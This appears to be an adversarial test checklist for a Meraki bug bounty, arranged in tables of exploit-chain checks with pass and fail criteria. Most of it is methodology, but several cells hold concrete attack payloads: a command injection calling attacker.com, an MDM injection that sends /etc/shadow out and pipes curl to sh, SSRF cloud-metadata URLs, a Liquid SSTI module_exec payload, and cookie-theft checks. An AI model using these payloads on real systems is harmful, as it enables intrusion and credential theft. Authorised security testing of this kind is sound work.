# Adversarial Checklists -- CDC Meraki Bug Bounty

## Rule
For each chain segment, the adversary must produce evidence that the exploit FAILS. If they cannot, the chain stands.

---

## Segment: LSP Default Credentials -> Configure Tab Command Injection

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-LSP-01 | Default creds work on target firmware? | `curl -u admin:serial` returns 200 + Configure tab | 401/403 / password changed / rate limited |
| AC-LSP-02 | Digest auth replayable? | Captured nonce reused successfully | Nonce stale / server rejects replay |
| AC-LSP-03 | Configure tab accepts Proxy URL input? | POST /configure with proxy_url reflects in config | Field missing / sanitized / rejected |
| AC-LSP-04 | Proxy URL executes commands? | `proxy_url=http://\`id\`.attacker.com` -> DNS callback | No callback / input sanitized / command fails |
| AC-LSP-05 | Command injection blind? | Time-based / OOB exfil works | No side channel; output not reflected |
| AC-LSP-06 | Shell persists reboot? | Implant in /storage survives reboot | Implant wiped on reboot |
| AC-LSP-07 | Firmware update kills implant? | Auto-update removes implant | Implant survives firmware update |

**Verdict**: If AC-LSP-01 through AC-LSP-05 ALL pass -> Pre-Auth RCE CONFIRMED.

---

## Segment: API IDOR -> Cross-Org Device Access

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-API-01 | Unauth GET /organizations/{orgId}/devices returns 200? | Device list + serials leaked | 401/403/404 |
| AC-API-02 | Expired/revoked key works? | Key revoked 30d ago still returns data | 401 |
| AC-API-03 | Key from Org A accesses Org B? | Org A key returns Org B devices | 403 |
| AC-API-04 | Rate limit bypass for enum? | 1000+ orgIds enumerated from single IP | Rate limited at ~5/sec |
| AC-API-05 | Serial -> LSP access works? | Serial from API -> DNS intercept -> LSP login | LSP not reachable / creds fail |
| AC-API-06 | Shard isolation holds? | n1 key cannot access n88 org data | Cross-shard access works |

**Verdict**: If AC-API-01 OR AC-API-02 OR AC-API-03 passes + AC-API-05 passes -> Pre-Auth RCE via IDOR CONFIRMED.

---

## Segment: Splash SSRF (splashUrl Server-Side Fetch)

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-SSRF-01 | splashUrl fetched server-side? | Attacker server sees request from Meraki ASN/IP | Only client browser fetches |
| AC-SSRF-02 | IMDSv1 accessible? | `http://169.254.169.254/latest/meta-data/` returns creds | Timeout / 404 / blocked |
| AC-SSRF-03 | GCP metadata accessible? | `http://metadata.google.internal/computeMetadata/v1/` returns token | Blocked |
| AC-SSRF-04 | localhost/internal ports accessible? | `http://localhost:8080/admin` returns data | Connection refused / filtered |
| AC-SSRF-05 | Response exfiltrated? | SSRF response appears in splash page / error log / callback | No exfiltration channel |
| AC-SSRF-06 | Requires auth to trigger? | Unauthenticated association triggers fetch | Requires valid API key / admin session |

**Verdict**: If AC-SSRF-01 passes + (AC-SSRF-02 OR AC-SSRF-03 OR AC-SSRF-04) passes + AC-SSRF-05 passes -> SSRF CONFIRMED.

---

## Segment: Splash Theme XSS -> Dashboard Admin Takeover

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-XSS-01 | Theme asset uploaded with `<script>`? | GET /splash/assets/{id} returns raw `<script>` | HTML encoded / sanitized / stripped |
| AC-XSS-02 | Dashboard Preview renders in same origin? | `document.domain` = `nXXX.meraki.com` in Preview iframe | Preview in sandboxed iframe / different origin |
| AC-XSS-03 | CSP blocks inline script? | `Content-Security-Policy` allows `unsafe-inline` | CSP blocks script execution |
| AC-XSS-04 | Admin session cookie accessible? | `document.cookie` contains `_meraki_session` | HttpOnly / SameSite=Strict / no cookie |
| AC-XSS-05 | API key in localStorage? | `localStorage.getItem('apiKey')` returns key | No API key stored client-side |
| AC-XSS-06 | Stolen session pushes firmware? | `PUT /devices/{serial}/upgrade` succeeds with stolen session | 403 / invalid scope / MFA required |

**Verdict**: If AC-XSS-01 through AC-XSS-05 ALL pass -> XSS -> Admin Takeover CONFIRMED.

---

## Segment: Subdomain Takeover -> Splash Supply Chain

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-SUB-01 | Dangling CNAME to network-auth.com? | `dig CNAME victim.network-auth.com` -> attacker-controlled target | No dangling CNAMEs |
| AC-SUB-02 | Wildcard cert covers attacker subdomain? | `*.network-auth.com` cert valid for `evil.network-auth.com` | Cert pinned / no wildcard |
| AC-SUB-03 | Victim SSID loads attacker splash? | Guest connects -> browser loads `evil.network-auth.com` | Meraki validates domain ownership |
| AC-SUB-04 | sentryEnrollment abused via attacker splash? | Malicious splash triggers MDM enrollment to attacker server | Enrollment only to Meraki ikarem.io |
| AC-SUB-05 | Credential harvest works? | Guest enters creds -> attacker receives them | No form / form submits to Meraki |

**Verdict**: If AC-SUB-01 OR AC-SUB-02 passes + AC-SUB-03 passes -> Supply Chain CONFIRMED.

---

## Segment: Firmware Supply Chain (ikarem.io -> Fleet)

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-FW-01 | Artifactory anonymous read? | `curl https://artifactory.ikarem.io/artifactory/` lists firmware | 403 / 401 |
| AC-FW-02 | Firmware signing key accessible? | Private key in Artifactory / NetBox / Jira | Keys in HSM / not stored |
| AC-FW-03 | ArgoCD deploys unsigned images? | ArgoCD sync pulls malicious image from attacker repo | Signature verification enforced |
| AC-FW-04 | Device auto-updates without verification? | Device installs unsigned/downgraded firmware | Secure boot enforces signed only |
| AC-FW-05 | Downgrade to vulnerable version? | Device accepts firmware N-1 with known RCE | Downgrade blocked / version check |

**Verdict**: If AC-FW-01 passes + (AC-FW-02 OR AC-FW-03) passes + AC-FW-04 passes -> Supply Chain RCE CONFIRMED.

---

## Segment: Device Local Parsing (Config Import / Firmware Upload)

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-PARSE-01 | Firmware upload endpoint exists? | POST /firmware/upload accepts multipart | 404 / no such endpoint |
| AC-PARSE-02 | Path traversal in firmware filename? | `../../../etc/passwd` written outside upload dir | Sanitized / chrooted |
| AC-PARSE-03 | Config import parses XML/JSON/YAML unsafely? | XXE / deserialization RCE via config import | Safe parser / no import |
| AC-PARSE-04 | Diagnostic commands injectable? | `ping` / `traceroute` / `tcpdump` fields inject commands | Input validated / no shell metachars |
| AC-PARSE-05 | HTTP request smuggling on LSP? | CL.TE / TE.CL desync -> request smuggling | Proper Content-Length handling |

**Verdict**: Any ONE of AC-PARSE-02 through AC-PARSE-05 passes -> Local Parsing RCE CONFIRMED.

---

## Segment: Rails Dashboard Mass Assignment -> SSTI -> Deserialization

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-RAILS-01 | Mass assignment bypass via nested params? | `params[:device][:firmware_attributes][:checksum]` accepted | Strong params rejects extra keys |
| AC-RAILS-02 | SSTI via `render inline:` in Alerts preview? | `{{7*7}}` executes in preview response | Template escaped / no execution |
| AC-RAILS-03 | Liquid::Template.parse instance_eval works? | `{{ ''.class.ancestors.first.module_exec { \`id\` } }}` executes | Instance eval blocked |
| AC-RAILS-04 | Marshal deserialization via signed cookie? | Forged session with gadget chain executes `system()` | Invalid signature / gadget chain fails |
| AC-RAILS-05 | secret_key_base extractable from CI? | RAILS_MASTER_KEY in CI logs/secrets.yml.enc | Key rotated / not accessible |
| AC-RAILS-06 | Cross-shard session hijack works? | Forged session with `admin_shard_ids=[*1..100]` works | Shard isolation enforced |

**Verdict**: If AC-RAILS-01 through AC-RAILS-04 ALL pass -> Rails Dashboard RCE CONFIRMED.

---

## Segment: API JWT Algorithm Confusion

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-JWT-01 | RS256->HS256 via missing kid? | JWT signed with public key as HMAC secret accepted | Gateway enforces RS256 only |
| AC-JWT-02 | GraphQL introspection bypass via fragment? | Aliased fragment returns full schema | Introspection fully blocked |
| AC-JWT-03 | Rate limit bypass via cursor org_id? | Modified cursor accesses other orgs' devices | Cursor org_id re-validated against token |

**Verdict**: If AC-JWT-01 OR AC-JWT-02 passes + AC-JWT-03 passes -> API Full Compromise CONFIRMED.

---

## Segment: MDM Enrollment Token Prediction

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-MDM-01 | Enrollment token predictable? | PID^Time seed -> brute force 2^16 space -> predicts next 100 tokens | CSPRNG properly seeded / fork_safety used |
| AC-MDM-02 | Command injection via device.model? | `model=iPhone; curl attacker.com/$(cat /etc/shadow)\|sh` executes | Input sanitized / mdmctl not root |
| AC-MDM-03 | Malicious .mobileconfig bypasses consent? | VPN UUID points to attacker VPN -> MITM all traffic | Profile MIME type enforced / user consent required |

**Verdict**: If AC-MDM-01 OR AC-MDM-02 passes + AC-MDM-03 passes -> MDM Full Compromise CONFIRMED.

---

## Segment: Cross-Shard Session Hijack (Rails Dashboard)

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-SHARD-01 | secret_key_base shared across shards? | `n1.meraki.com` session valid on `n88.meraki.com` | Shards use different keys |
| AC-SHARD-02 | secret_key_base in CI? | RAILS_MASTER_KEY in CI logs -> forge any shard session | Key not in CI / rotated per shard |
| AC-SHARD-03 | Forged session works cross-shard? | `session[:admin_shard_ids]=[*1..100]` grants admin on all | Shard isolation enforced |

**Verdict**: If AC-SHARD-01 AND AC-SHARD-02 pass -> Cross-Shard Admin Hijack CONFIRMED.

---

## Segment: vMX Cloud LSP Exposure

| Check | Adversarial Test | Pass = Exploitable | Fail = Not Exploitable |
|-------|------------------|-------------------|------------------------|
| AC-VMX-01 | vMX LSP exposed on public IP? | Azure NSG / AWS SG allows TCP 80 to vMX | SG blocks / no public IP |
| AC-VMX-02 | Default serial works? | `admin` / `Q2XX-XXXX-XXXX` authenticates | Serial not recognized |
| AC-VMX-03 | Proxy config reaches cloud metadata? | LSP proxy -> 169.254.169.254 returns creds | Proxy not applied to device traffic |
| AC-VMX-04 | Firmware downgrade possible? | Device accepts older firmware via LSP | Downgrade blocked / signature enforced |

**Verdict**: If AC-VMX-01 through AC-VMX-03 pass -> vMX Cloud Compromise CONFIRMED.